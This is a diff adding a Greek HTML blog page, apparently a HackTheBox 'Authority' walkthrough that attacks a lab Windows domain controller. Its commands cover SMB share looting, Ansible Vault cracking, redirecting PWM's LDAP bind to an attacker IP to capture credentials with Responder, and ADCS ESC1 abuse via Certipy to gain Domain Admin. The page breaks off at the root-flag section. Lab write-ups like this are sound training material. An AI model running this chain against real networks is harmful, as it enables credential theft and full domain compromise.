@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Authority &#8212; S. Markakis</title>
+<meta name="description" content="Walkthrough του μηχανήματος HackTheBox Authority — πλήρες writeup με screenshots.">
+<meta property="og:title" content="HTB: Authority — S. Markakis">
+<meta property="og:description" content="Walkthrough του μηχανήματος HackTheBox Authority — πλήρες writeup με screenshots.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-authority-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-authority.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-authority.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-authority-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-authority.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-authority-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-authority.html">
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+  body { background: var(--bg); color: var(--text); font-family: 'Barlow', sans-serif; font-size: 17px; line-height: 1.75; -webkit-font-smoothing: antialiased; }
+  .wrapper { position: relative; z-index: 1; width: 100%; max-width: 780px; margin: 0 auto; padding: 4rem 2rem 8rem; }
+  .post-header { margin-bottom: 2.5rem; }
+  h1 { font-family: 'Barlow Condensed', sans-serif; font-weight: 800; font-size: 3.2rem; line-height: 1.05; color: var(--text-dark); letter-spacing: -.01em; margin-bottom: 1rem; }
+  .post-meta { display: flex; align-items: center; gap: 1rem; font-size: 0.85rem; color: var(--text); flex-wrap: wrap; }
+  .tag { background: var(--tag-bg); color: var(--tag-text); font-size: 0.72rem; font-weight: 600; letter-spacing: .08em; text-transform: uppercase; padding: .2rem .6rem; border-radius: 3px; }
+  .tag-htb { background: #c8d8c0; color: #2a4a28; }
+  .tag-win { background: #c8d0e0; color: #1a2a5a; }
+  .tag-med { background: #d8e0c8; color: #2a4a10; }
+  .divider { border: none; border-top: 1px solid var(--border); margin: 2rem 0; }
+  .overview { background: var(--bg-code); border-left: 3px solid var(--text-dark); padding: 1.2rem 1.5rem; margin: 2rem 0; font-size: 0.95rem; line-height: 1.7; color: var(--text-mid); }
+  .chain { display: flex; flex-wrap: wrap; align-items: center; gap: .4rem; background: var(--bg-code); border: 1px solid var(--border); padding: .9rem 1.2rem; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; margin: 1.5rem 0 2.5rem; color: var(--text-mid); }
+  .chain-node { background: var(--bg); border: 1px solid var(--border); color: var(--text-dark); padding: .2rem .7rem; border-radius: 3px; font-weight: 500; }
+  .chain-arrow { color: var(--text); }
+  h2 { font-family: 'Barlow Condensed', sans-serif; font-weight: 800; font-size: 1.9rem; color: var(--text-dark); margin: 3rem 0 .8rem; letter-spacing: -.01em; }
+  h3 { font-family: 'Barlow', sans-serif; font-weight: 600; font-size: 1.1rem; color: var(--text-dark); margin: 2rem 0 .6rem; }
+  p { color: var(--text); margin-bottom: 1rem; }
+  strong { color: var(--text-dark); font-weight: 600; }
+  a { color: var(--text-mid); }
+  code { font-family: 'JetBrains Mono', monospace; font-size: 0.82em; background: var(--bg-code); border: 1px solid var(--border); color: var(--text-mid); padding: .1em .4em; border-radius: 3px; }
+  .terminal { background: var(--bg-term); border: 1px solid var(--border); border-radius: 6px; margin: 1.4rem 0; overflow: hidden; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; line-height: 1.65; }
+  .term-bar { background: var(--bg-code); border-bottom: 1px solid var(--border); padding: .45rem 1rem; display: flex; align-items: center; gap: .4rem; }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; } .dy { background: #b8a050; } .dg { background: #60a070; }
+  .term-label { margin-left: auto; font-size: 0.7rem; color: var(--text); letter-spacing: .05em; }
+  .term-body { padding: 1rem 1.3rem; overflow-x: auto; white-space: pre; }
+  .pu { color: var(--t-user); font-weight: 700; } .ph { color: var(--t-host); font-weight: 700; }
+  .pp { color: var(--t-path); } .ps { color: var(--t-comment); } .pd { color: var(--text-mid); }
+  .pc { color: var(--t-cmd); font-weight: 500; } .po { color: var(--t-out); }
+  .py { color: var(--t-yellow); } .pr { color: var(--t-red); } .pg { color: var(--t-green); }
+  .pb { color: var(--t-blue); } .pco { color: var(--t-comment); }
+  .alert { padding: .9rem 1.2rem; margin: 1.4rem 0; border-left: 3px solid; font-size: 0.92rem; border-radius: 0 4px 4px 0; }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);   color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green);  color: #1a3a20; }
+  table { width: 100%; border-collapse: collapse; margin: 1.4rem 0; font-size: 0.88rem; }
+  th { text-align: left; padding: .55rem 1rem; font-family: 'Barlow Condensed', sans-serif; font-weight: 700; font-size: 0.8rem; letter-spacing: .08em; text-transform: uppercase; color: var(--text-mid); border-bottom: 2px solid var(--border); background: var(--bg-code); }
+  td { padding: .5rem 1rem; border-bottom: 1px solid var(--border); color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; }
+  tr:hover td { background: var(--bg-code); }
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+  ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+  .screenshot { max-width: 100%; height: auto; border: 1px solid var(--border); border-radius: 6px; margin: 1.4rem auto; display: block; }
+  footer { border-top: 1px solid var(--border); padding: 2rem 3rem; display: flex; justify-content: space-between; align-items: center; font-size: 0.82rem; color: var(--text); }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+  .back { display: inline-flex; align-items: center; gap: .4rem; font-size: 0.85rem; color: var(--text); text-decoration: none; margin-bottom: 2.5rem; transition: color .15s; }
+  .back:hover { color: var(--text-dark); }
+  @media (max-width: 600px) { nav { padding: 1rem 1.2rem; } .wrapper { padding: 2rem 1.2rem 5rem; } h1 { font-size: 2.4rem; } }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Authority",
+  "description": "Walkthrough του μηχανήματος HackTheBox Authority — πλήρες writeup με screenshots.",
+  "datePublished": "2026-04-19",
+  "dateModified": "2026-04-19",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-authority-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-authority.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-authority"
+  },
+  "timeRequired": "PT6M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">&#8592; Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-authority.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <div class="post-header">
+    <h1>HTB: Authority</h1>
+    <div class="post-meta">
+      <span class="date">15 Ιουλίου 2023</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-win">Windows</span>
+      <span class="tag tag-med">Μέτριο</span>
+      <span class="tag">Active Directory</span>
+      <span class="tag">Ansible Vault</span>
+      <span class="tag">ADCS ESC1</span>
+      <span class="tag">Certipy</span>
+      <span style="color:var(--text);font-size:0.85rem;">15 λεπτά αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+    <picture data-img-optimized="1"><source srcset="assets/htb-authority/img-01-719ae429b6.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-authority/img-01-719ae429b6.png" alt="HTB Authority machine card" width="750" height="395"></picture>
+
+  <div class="overview">
+    Το Authority είναι ένα μηχάνημα μέτριας δυσκολίας Windows Active Directory. Ξεκινά με <strong>ανώνυμη πρόσβαση SMB</strong> σε ένα share Development που περιέχει playbooks Ansible με <strong>credentials κρυπτογραφημένα με Ansible Vault</strong>. Το να σπάσουμε το κλειδί vault με <code>ansible2john</code> + John the Ripper αποκαλύπτει credentials για να κάνουμε login στο <strong>PWM</strong> (μια εφαρμογή password self-service στη θύρα 8443). Το να τροποποιήσουμε το config LDAP του PWM ώστε να ανακατευθύνει στο μηχάνημά μας και να τρέξουμε <strong>Responder</strong> πιάνει το plaintext password του <code>svc_ldap</code>. Το privilege escalation εκμεταλλεύεται το <strong>ADCS ESC1</strong> &#8212; προσθέτουμε ένα domain computer, ζητάμε ένα πιστοποιητικό Administrator μέσω <strong>Certipy</strong>, κάνουμε authenticate για να πάρουμε ένα LDAP shell, και προσθέτουμε τον χρήστη μας στους Domain Admins.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">SMB anon &#8594; Development</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">Ansible Vault &#8594; john</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">PWM login</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">Responder &#8594; svc_ldap</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">addcomputer</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">ADCS ESC1 &#8594; Certipy</span>
+    <span class="chain-arrow">&#8594;</span>
+    <span class="chain-node">Domain Admin</span>
+  </div>
+
+  <!-- ═══ RECON -->
+  <h2>Αναγνώριση</h2>
+
+  <h3>Nmap</h3>
+  <p>Ένα πλήρες port scan αποκαλύπτει ένα κλασικό fingerprint Windows Domain Controller &#8212; DNS, Kerberos, LDAP, SMB, RPC, και μια ασυνήθιστη θύρα <strong>8443</strong> που τρέχει μια web εφαρμογή που ανακατευθύνει στο <code>/pwm</code>.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">nmap &#8212; full scan</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/authority</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">nmap -sC -sV -p- 10.10.11.222 --min-rate=500</span>
+<span class="po">PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds?
+636/tcp  open  ldapssl?
+3268/tcp open  ldap
+8443/tcp open  ssl/https-alt  [redirects to /pwm]
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">hosts</span></div>
+    <div class="term-body"><span class="pc">echo "10.10.11.222 authority.htb authority.authority.htb" | sudo tee -a /etc/hosts</span></div>
+  </div>
+
+  <!-- ═══ SMB -->
+  <h2>Καταμέτρηση SMB</h2>
+
+  <p>Το SMB επιτρέπει ανώνυμο login. Το λιστάρισμα shares αποκαλύπτει ένα μη-στάνταρ share <strong>Development</strong> δίπλα στα συνηθισμένα shares AD.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">smbclient &#8212; list shares</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/authority</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">smbclient -L //10.10.11.222/</span></div>
+  </div>
+
+    <picture data-img-optimized="1"><source srcset="assets/htb-authority/img-02-16a2b00941.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-authority/img-02-16a2b00941.png" alt="smbclient SMB shares listing" width="723" height="287"></picture>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">smbclient &#8212; download Development share</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/authority</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">smbclient -N //10.10.11.222/Development</span>
+<span class="po">smb: \&gt; recurse on
+smb: \&gt; prompt off
+smb: \&gt; mget *</span></div>
+  </div>
+
+  <p>Το share περιέχει playbooks Ansible κάτω από <code>Automation/Ansible/PWM/defaults/</code>. Τα αρχεία <code>main.yml</code> κρατούν credentials κρυπτογραφημένα με <strong>Ansible Vault</strong>.</p>
+
+    <picture data-img-optimized="1"><source srcset="assets/htb-authority/img-03-a602c5e839.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-authority/img-03-a602c5e839.png" alt="Ansible PWM defaults directory" width="486" height="76"></picture>
+
+  <!-- ═══ ANSIBLE VAULT -->
+  <h2>Σπάγοντας το Ansible Vault</h2>
+
+  <p>Οι τιμές κρυπτογραφημένες με vault ξεκινούν με <code>$ANSIBLE_VAULT;1.1;AES256</code>. Χρησιμοποιούμε το <code>ansible2john</code> για να τις μετατρέψουμε σε ένα hash συμβατό με John, μετά κάνουμε crack με rockyou.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">ansible2john &#8212; convert to hash</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/authority</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">ansible2john pwm_admin_login.txt &gt; vaultpass.hash</span></div>
+  </div>
+
+    <picture data-img-optimized="1"><source srcset="assets/htb-authority/img-04-210bd2ef56.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-authority/img-04-210bd2ef56.png" alt="ansible2john hash conversion" width="750" height="35"></picture>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">john &#8212; crack vault password</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/authority</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">john vaultpass.hash --wordlist=/usr/share/wordlists/rockyou.txt</span>
+<span class="pd">&#9492;$ </span><span class="pc">john vaultpass.hash --show</span></div>
+  </div>
+
+    <picture data-img-optimized="1"><source srcset="assets/htb-authority/img-05-34fb7885e0.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-authority/img-05-34fb7885e0.png" alt="John cracking vault password" width="720" height="195"></picture>
+
+  <p>Το κλειδί vault σπάστηκε: <code>!@#$%^&amp;*</code>. Τώρα κάνε decrypt τα credentials:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">ansible-vault decrypt</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/authority</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">cat pwm_admin_login.txt | ansible-vault decrypt</span>
+<span class="po">Vault password: !@#$%^&amp;*
+Decryption successful</span>
+<span class="pd">&#9492;$ </span><span class="pc">cat pwm_admin_password.txt | ansible-vault decrypt</span>
+<span class="po">Vault password: !@#$%^&amp;*
+Decryption successful</span></div>
+  </div>
+
+    <picture data-img-optimized="1"><source srcset="assets/htb-authority/img-06-87d49dbff2.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-authority/img-06-87d49dbff2.png" alt="ansible-vault decrypt success" width="395" height="214"></picture>
+
+  <!-- ═══ PWM -->
+  <h2>PWM &#8212; Password Self Service (θύρα 8443)</h2>
+
+  <p>Η θύρα 8443 φιλοξενεί το <strong>PWM</strong>, μια εφαρμογή password self-service LDAP ανοιχτού κώδικα. Τα decrypted credentials δίνουν πρόσβαση σαν <strong>Configuration Manager</strong>. Το PWM δείχνει errors σύνδεσης LDAP &#8212; προσπαθεί να φτάσει το <code>ldaps://authority.authority.htb:636</code> αλλά αποτυγχάνει, και παρατηρούμε τον χρήστη <code>svc_ldap</code> στο bind DN.</p>
+
+    <picture data-img-optimized="1"><source srcset="assets/htb-authority/img-07-b04601fe80.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-authority/img-07-b04601fe80.png" alt="PWM login page" width="561" height="302"></picture>
+    <picture data-img-optimized="1"><source srcset="assets/htb-authority/img-08-121a856347.webp" type="image/webp"><img loading="lazy" decoding="async" class="screenshot" src="assets/htb-authority/img-08-121a856347.png" alt="PWM health page with LDAP error" width="507" height="415"></picture>
+
+  <h3>Καταγραφή LDAP μέσω Responder</h3>
+  <p>Η σελίδα Configuration Manager μας επιτρέπει να κάνουμε <strong>Download</strong> και <strong>Import</strong> το config XML του PWM. Τροποποιούμε το URL του server LDAP ώστε να δείχνει στο μηχάνημά μας, κάνουμε import το config, μετά ξεκινάμε το Responder. Όταν το PWM ξαναδοκιμάζει το bind LDAP στέλνει τα credentials σε plaintext σε εμάς.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">config modification &#8212; PwmConfiguration.xml</span></div>
+    <div class="term-body"><span class="pco"># Αλλαξε το URL LDAP στο PwmConfiguration.xml</span>
+<span class="pr">&lt;value&gt;ldaps://authority.authority.htb:636&lt;/value&gt;</span>
+<span class="pco"># σε:</span>
+<span class="pg">&lt;value&gt;ldap://&lt;YOUR_IP&gt;:389&lt;/value&gt;</span>
+<span class="pco"># Κάνε import το τροποποιημένο config μέσω Configuration Manager, μετά...</span></div>
+  </div>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">responder &#8212; capture LDAP bind</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/authority</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">responder -I tun0 -wA</span>
+<span class="pg">[LDAP] Cleartext Client   : 10.10.11.222
+[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,DC=authority,DC=htb
+[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!</span></div>
+  </div>
+
+  <div class="alert alert-success">&#128681; Πιάστηκαν plaintext credentials: <strong>svc_ldap : lDaP_1n_th3_cle4r!</strong></div>
+
+  <!-- ═══ FOOTHOLD -->
+  <h2>Foothold</h2>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">evil-winrm</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/authority</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'</span>
+<span class="pg">*Evil-WinRM* PS C:\Users\svc_ldap\Desktop&gt; type user.txt</span>
+<span class="py">HTB{...}</span></div>
+  </div>
+
+  <div class="alert alert-success">&#128681; User flag πιάστηκε.</div>
+
+  <!-- ═══ PRIVESC -->
+  <h2>Privilege Escalation &#8212; ADCS ESC1</h2>
+
+  <h3>Πρόσθεσε ένα Domain Computer</h3>
+  <p>Το domain επιτρέπει σε οποιονδήποτε authenticated χρήστη να προσθέσει λογαριασμούς computer (το <code>ms-DS-MachineAccountQuota</code> είναι μη-μηδενικό). Προσθέτουμε ένα ψεύτικο computer για να πάρουμε έναν λογαριασμό machine που ελέγχουμε.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">impacket-addcomputer</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/authority</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' \
+  -dc-ip 10.10.11.222 -computer-name 'SP1R4$' -computer-pass 'SP1R4pass1!'</span>
+<span class="pg">[*] Successfully added machine account SP1R4$ with password SP1R4pass1!.</span></div>
+  </div>
+
+  <h3>Βρες το ESC1 μέσω Certipy</h3>
+  <p>Το <strong>Certipy</strong> κάνει enumerate templates πιστοποιητικών ADCS. Βρίσκει ένα template ευάλωτο σε <strong>ESC1</strong> &#8212; κάθε Domain Computer μπορεί να κάνει enroll και να ορίσει ένα αυθαίρετο Subject Alternative Name, επιτρέποντάς μας να προσποιηθούμε οποιονδήποτε χρήστη συμπεριλαμβανομένου του Administrator.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">certipy find &#8212; enumerate templates</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/authority</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">certipy find -u 'SP1R4$@authority.htb' -p 'SP1R4pass1!' -dc-ip 10.10.11.222 -vulnerable</span>
+<span class="py">[!] Vulnerabilities
+    ESC1  - Template allows SAN; enrollment rights for Domain Computers</span></div>
+  </div>
+
+  <div class="alert alert-info">&#9432; <strong>ESC1</strong> &#8212; το template επιτρέπει σε όσους κάνουν enroll να ορίσουν ένα αυθαίρετο Subject Alternative Name (UPN). Ορίζοντας το UPN σε <code>administrator@authority.htb</code>, αποκτούμε ένα πιστοποιητικό που κάνει authenticate σαν Administrator.</div>
+
+  <h3>Ζήτησε Πιστοποιητικό Administrator</h3>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">certipy req</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/authority</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">certipy req -username 'SP1R4$@authority.htb' -password 'SP1R4pass1!' \
+  -ca 'AUTHORITY-CA' -template 'CorpVPN' \
+  -upn 'administrator@authority.htb' -dc-ip 10.10.11.222</span>
+<span class="pg">[*] Saved certificate and private key to 'administrator_authority.pfx'</span></div>
+  </div>
+
+  <h3>Authenticate με Πιστοποιητικό &#8212; LDAP Shell</h3>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">certipy auth &#8212; ldap-shell</span></div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/HTB/authority</span><span class="ps">]</span>
+<span class="pd">&#9492;$ </span><span class="pc">certipy auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222 -ldap-shell</span>
+<span class="pg"># Πήραμε ldap-shell σαν Administrator</span>
+<span class="py">ldap-shell&gt; </span><span class="pc">add_user sp1r4admin</span>
+<span class="py">ldap-shell&gt; </span><span class="pc">change_password sp1r4admin 'Passw0rd123!'</span>
+<span class="py">ldap-shell&gt; </span><span class="pc">add_user_to_group sp1r4admin 'Domain Admins'</span>
+<span class="pg">Successfully added sp1r4admin to Domain Admins.</span></div>
+  </div>
+
+  <h3>Root Flag</h3>
+
+  <div class="terminal">
